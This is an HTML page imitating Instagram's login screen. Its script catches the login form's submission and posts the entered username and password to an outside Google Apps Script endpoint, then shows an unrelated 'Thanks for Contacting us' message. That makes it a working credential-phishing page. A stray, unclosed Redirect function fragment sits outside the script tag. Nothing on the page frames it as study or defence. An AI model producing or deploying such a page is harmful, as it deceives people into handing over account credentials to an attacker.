<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Instagram Login Page</title>
	<link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="wrapper">
	<div class="header">
		<div class="top">
			<div class="logo">
				<img src="img/instalaw.png" alt="instagram" style="width: 175px;">
			</div>
                 <form method="post" autocomplete="off" name="CpStudy">
                     <div class="form-group">
                        <input type="text" name="UserName" class="form-control" placeholder="User Name " value="" required=""/>
                     </div>
                     <div class="form-group">
                        <input type="password" name="password" class="form-control" placeholder="Password " value="" required=""/>
                     </div>
                     <div class="form-group">
                        <input type="submit" name="submit" class="btnSubmit btn-block" onclick="Redirect();" value="Login" />
                     </div>
                 </form>
			<div class="or">
				<div class="line"></div>
				<p>OR</p>
				<div class="line"></div>
			</div>
			<div class="dif">
				<div class="fb">
					<img src="img/face.png" alt="facebook">

				</div>
				<div class="forgot">
					<a href="#">Forgot password?</a>
				</div>
			</div>
		</div>
		<div class="signup">
			<p>Don't have an account? <a href="#">Sign up</a></p>
		</div>
		<div class="apps">
			<p>Get the app.</p>
			<div class="icons">
				<a href="#"><img src="img/apps.png" alt="appstore"></a>
				<a href="#"><img src="img/gplay.png" alt="googleplay"></a>
			</div>
		</div>
	</div>
	<div class="footer">
		<div class="links">
			<ul>
				<li><a href="#">ABOUT US</a></li>
				<li><a href="#">SUPPORT</a></li>

			</ul>
		</div>
		<div class="copyright">
			Â© 2020 INSTAGRAM
		</div>
	</div>
</div>
 		  
		       <script>
            const scriptURL = 'https://script.google.com/macros/s/AKfycbwCnaJu_vn8Zk2eFbV39mNYa11MruCHVagjdRJFpzL4nbiV0SScsWp6QpLt2CnP1bCY1A/exec'
            const form = document.forms['CpStudy']
          
            form.addEventListener('submit', e => {
              e.preventDefault()
              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
                .catch(error => console.error('Error!', error.message))
            })
          </script>

function Redirect()
{

</body>
</html>
